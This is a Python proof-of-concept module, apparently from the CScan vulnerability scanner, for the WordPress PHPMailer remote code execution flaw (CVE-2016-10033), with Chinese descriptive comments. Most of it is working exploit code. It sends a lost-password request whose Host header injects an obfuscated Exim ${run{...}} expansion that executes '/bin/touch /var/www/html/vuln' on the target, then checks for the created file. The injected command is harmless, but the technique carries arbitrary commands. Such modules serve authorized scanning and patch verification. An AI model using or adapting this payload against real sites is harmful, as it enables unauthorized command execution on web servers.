# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0003_p'  # 平台漏洞编号，留空
    name = 'WordPress PHPmailer 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-05-03'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        WordPress的PHPMailer漏洞利用细节在WordPress核心中的实现。未经授权的攻击者利用漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4204/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2016-10033'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress PHPmailer < 4.7.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ce1a2fb0-9058-46cc-b059-6c868d169384'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-23'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 命令执行漏洞，利用的是wordpres的密码重置，验证的时候判断是否在网站根目录下建立/var/www/html/vuln的文件夹
            data = {
                "wp-submit": "Get+New+Password",
                "redirect_to": '',
                "user_login": "admin"
            }
            payload = '''/wp-login.php?action=lostpassword'''
            headers = {
                'Host': '''target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}vuln}} null)'''
            }
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            _request = requests.post('{target}{payload}'.format(
                target=self.target, payload=payload), data=data, headers=headers)
            vulnurl = requests.get('{target}/vuln'.format(target=self.target))

            if vulnurl.status_code == 200 and vulnurl.url == self.target+"/vuln":
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
